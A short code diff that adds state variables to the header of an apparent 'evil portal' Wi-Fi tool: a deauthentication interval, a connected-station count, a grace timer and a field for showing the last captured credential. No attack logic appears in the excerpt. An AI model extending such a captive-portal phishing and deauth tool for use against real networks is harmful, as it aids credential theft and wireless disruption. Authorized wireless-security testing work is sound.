@@ -90,6 +90,13 @@ private:
     unsigned long _launchTime = 0;
     unsigned long _lastPageViewTime = 0;
 
+    // --- added for rewritten evil_portal.cpp ---
+    int           _lastDeauthIntervalMs = 250;   // encoder-adjustable deauth interval
+    int           _connectedStations    = 0;     // live softAP station count
+    unsigned long _graceEndTime         = 0;     // 15 s grace after new association
+    String        lastCredDisplay;               // formatted last-cred text for screen
+    // -------------------------------------------
+
     void portalController(AsyncWebServerRequest *request);
     void credsController(AsyncWebServerRequest *request);
 
